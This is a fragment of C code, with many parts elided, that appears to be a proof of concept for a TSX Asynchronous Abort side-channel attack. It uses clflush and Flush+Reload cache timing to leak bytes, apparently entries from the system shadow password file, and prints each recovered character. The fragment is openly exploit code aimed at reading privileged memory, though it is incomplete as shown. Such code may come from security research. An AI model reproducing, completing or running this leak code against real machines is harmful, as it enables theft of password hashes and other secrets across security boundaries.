...
void try_paper_code() {
    ...
    while(found_index < SHADOW_ENTRY_LEN + 1) {
        ...
        while(1) {
            ...
            tsxabort_leak_clflush(leak + index, reloadbuffer2, index, mask, reloadbuffer, reloadbuffer2);
            // masked_taa_leak(leak_mapping + index, buf, mask);
            iter++;

            // F+R -> mark found value in histogram
            for(int i=DUMMY_HIT; i<=END_INDEX; i++) {
                // int time = time_flush_reload(buf + PROBE_STRIDE * i);
                ...
                if(time < CACHE_THRESHOLD) {
                    if(i != DUMMY_HIT) {
                        ...
                        for(int k=START_INDEX; k<=END_INDEX; k++) {
                            time = time_flush_reload(reloadbuffer2 + PROBE_STRIDE * k);
                            if(time < CACHE_THRESHOLD) {
                                printf("Buf 2: 0x%x=%c\n", k, k);
                                update2 = k;
                            }
